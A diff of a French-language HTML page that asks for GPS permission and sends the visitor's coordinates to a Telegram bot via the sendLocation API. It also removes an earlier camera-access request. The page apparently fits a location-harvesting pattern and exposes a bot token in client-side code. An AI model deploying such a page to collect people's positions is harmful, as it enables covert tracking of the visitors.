@@ -32,7 +32,7 @@
 <body>
 
     <h1>Validation de votre position</h1>
-    <p>Veuillez autoriser l'accès au GPS et à la caméra pour continuer.</p>
+    <p>Veuillez autoriser l'accès au GPS pour continuer.</p>
     
     <button id="authButton">Autoriser et Envoyer</button>
 
@@ -59,15 +59,14 @@
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
 
-                    // 4. Préparer le message à envoyer sur Telegram
-                    const messageText = `📍 Position reçue !\nLatitude : ${latitude}\nLongitude : ${longitude}`;
-                    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
+                    // 4. Utiliser l'API sendLocation de Telegram pour envoyer une carte interactive
+                    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
 
                     try {
-                        // 5. Envoyer les données au bot via une requête réseau
+                        // 5. Envoyer la position au bot via une requête réseau
                         const response = await fetch(telegramApiUrl);
                         if (response.ok) {
-                            alert("Position partagée et envoyée avec succès dans votre discussion Telegram !");
+                            alert("Position GPS envoyée avec succès sur Telegram sous forme de carte !");
                         } else {
                             alert("Erreur lors de l'envoi de la position au bot.");
                         }
